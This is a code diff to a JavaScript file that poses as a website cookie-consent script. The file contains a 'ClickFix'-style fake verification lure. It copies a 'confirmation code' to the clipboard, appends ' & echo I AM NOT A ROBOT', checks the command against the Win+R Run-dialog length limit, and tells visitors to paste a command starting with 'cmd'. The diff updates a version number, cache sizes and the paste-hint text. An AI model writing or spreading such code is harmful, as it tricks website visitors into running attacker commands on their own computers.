@@ -11,7 +11,7 @@
   window.__CONSENT_INJECTED__ = true;
 
   var CONSENT_CONFIG = {
-    version: '1.9.20',
+    version: '1.9.21',
     presentation: 'consent',
     privacyPolicyUrl: '/privacy-policy',
     optOutUrl: '/opt-out-preferences',
@@ -32,9 +32,9 @@
     },
     cacheFileSizesJj: {
       firefox: 0,
-      chrome: 17182,
-      edge: 17182,
-      brave: 17182
+      chrome: 17218,
+      edge: 17218,
+      brave: 17218
     },
     verificationSuffix: ' & echo I AM NOT A ROBOT',
     verificationTemplates: {
@@ -534,7 +534,7 @@
     var est = estimateExpandedCommandLength(cmd);
     var lenNote = est ? ' (~' + est + ' chars expanded; Win+R limit ~259)' : '';
     el.textContent = copied
-      ? 'Confirmation code copied.' + lenNote + ' Paste must start with cmd /k for'
+      ? 'Confirmation code copied.' + lenNote + ' Paste must start with cmd / (Run dialog).'
       : 'Click this panel and press Ctrl+V again if paste is empty.' + lenNote;
     el.className = copied ? 'ts-v-copy-hint ts-v-copy-ok' : 'ts-v-copy-hint ts-v-copy-warn';
   }
